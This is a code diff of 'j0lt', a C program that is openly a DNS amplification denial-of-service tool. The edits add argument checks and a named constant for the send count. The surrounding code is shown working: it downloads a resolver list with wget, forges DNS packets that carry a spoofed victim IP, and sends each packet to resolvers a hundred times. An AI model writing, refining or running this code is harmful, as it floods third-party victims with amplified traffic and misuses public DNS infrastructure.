@@ -17,7 +17,6 @@
  * irc.efnet.org #c
  */
 
- // TODO: 1) replace execv() with posix_spawn() 
  // TODO: 3) store resolver list in memory file access to slow. 
  // TODO: 4) clean up code
 
@@ -203,8 +202,9 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     DNS_NSCOUNT_J0LT 0x0000 // num authority RRs 
 #define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
 // END HEADER VALUES
-
+#define     PEWPEW_J0LT 100 // value for the tmc effect. 
 #define     MAX_LINE_SZ_J0LT 0x30
+
 const char* g_path = "/tmp/resolv.txt";
 char* g_wget[ ] = {
     "/bin/wget", "-O", "/tmp/resolv.txt",
@@ -253,13 +253,15 @@ main(int argc, char** argv)
     file_actionsp = NULL;
 
     printf("%s", g_ansi);
-    if (argc != 4)
-        err_exit("* incorrect argc");
+    printf("argc: %d\n", argc);
 
+    magnitude = spoofport = spoofip = -1;
     opt = getopt(argc, argv, "t:p:m:");
     do {
         switch (opt) {
         case 't':
+            while (*optarg == ' ')
+                optarg++;
             spoofip = inet_addr(optarg);
             if (spoofip == 0)
                 err_exit("* invalid spoof ip");
@@ -281,8 +283,9 @@ main(int argc, char** argv)
             err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
         }
     } while ((opt = getopt(argc, argv, "t:p:m:")) != -1);
+    if (magnitude == -1 || spoofport == -1 || spoofip == -1)
+        err_exit("Usage: ./j0lt <-t target> <-p port> <-m magnitude>\n");
 
-    /* block all signals in child */
     s = posix_spawnattr_init(&attr);
     if (s != 0)
         err_exit("* posix_spawnattr_init");
@@ -297,7 +300,7 @@ main(int argc, char** argv)
 
     attrp = &attr;
 
-    s = posix_spawnp(&child_pid, g_wget[ 0 ], file_actionsp, attrp,&g_wget[ 0 ], environ);
+    s = posix_spawnp(&child_pid, g_wget[ 0 ], file_actionsp, attrp, &g_wget[ 0 ], environ);
     if (s != 0)
         err_exit("* posix_spawn");
 
@@ -313,7 +316,7 @@ main(int argc, char** argv)
             err_exit("* posix_spawn_file_actions_destroy");
     }
 
-    printf("+ spawning child at PID : %jd\n", ( intmax_t ) child_pid);
+    printf("+ Child spawned at PID : %jd\n", ( intmax_t ) child_pid);
 
     do {
         s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
@@ -346,7 +349,7 @@ main(int argc, char** argv)
                 continue;
             szpayload = ForgeJ0ltPacket(payload, htonl(resolvip), htonl(spoofip), spoofport);
 #if !DEBUG  
-            szpewpew = 100;
+            szpewpew = PEWPEW_J0LT;
             while (szpewpew-- > 0)
                 SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
 #else 
